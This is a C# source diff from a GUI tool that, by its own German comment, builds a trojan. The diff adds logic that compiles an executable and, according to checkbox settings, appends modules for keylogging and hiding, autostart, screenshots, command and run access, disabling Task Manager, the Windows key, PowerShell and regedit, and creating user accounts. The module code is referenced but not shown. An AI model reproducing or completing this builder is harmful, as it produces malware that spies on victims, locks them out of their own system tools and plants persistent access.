@@ -1131,6 +1131,10 @@ namespace DNAV_GUI
             parameters.GenerateExecutable = true;
             parameters.OutputAssembly = path;
 
+            parameters.ReferencedAssemblies.Add("System.dll");
+            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
+
+
             string code = "using System;using System.Threading;";
 
             if (useSystemDiagnostics)
@@ -1159,14 +1163,62 @@ namespace DNAV_GUI
             code += "Console.WriteLine(\"Hallo Welt\");Console.ReadLine();";
             // Hier landet Code, welcher in den Trojaner soll.
 
-            if (keyloggerCheckbox.IsChecked == true)
+
+
+            code += "}"; // Close void Main
+            code += "}"; // Close class Program
+
+            if (keyloggerCheckbox.IsChecked == true || hideCheckbox.IsChecked == true)
             {
-                
+                code += keyloggerHideCode;
             }
 
-            code += "}";
-            code += "}";
-            code += "}";
+            if (autostartCheckbox.IsChecked == true)
+            {
+                code += autostartCode;
+            }
+
+            if (screenshotCheckbox.IsChecked == true)
+            {
+                code += screenshotCode;
+            }
+
+            if (cmdCheckbox.IsChecked == true)
+            {
+                code += cmdCode;
+            }
+            
+            if (runCheckbox.IsChecked == true)
+            {
+                code += runCode;
+            }
+
+            if (taskmanagerCheckbox.IsChecked == true)
+            {
+                code += taskmanagerCode;
+            }
+
+            if (windowskeyCheckbox.IsChecked == true)
+            {
+                code += windowskeyCode;
+            }
+
+            if (powershellCheckbox.IsChecked == true)
+            {
+                code += powershellCode;
+            }
+
+            if (regeditCheckbox.IsChecked == true)
+            {
+                code += regeditCode;
+            }
+
+            if (createUserCheckbox.IsChecked == true)
+            {
+                code += createUserCode;
+            }
+
+            code += "}"; // Close Namespace
 
             CompilerResults results = provider.CompileAssemblyFromSource(parameters, code);
             if (results.Errors.HasErrors)
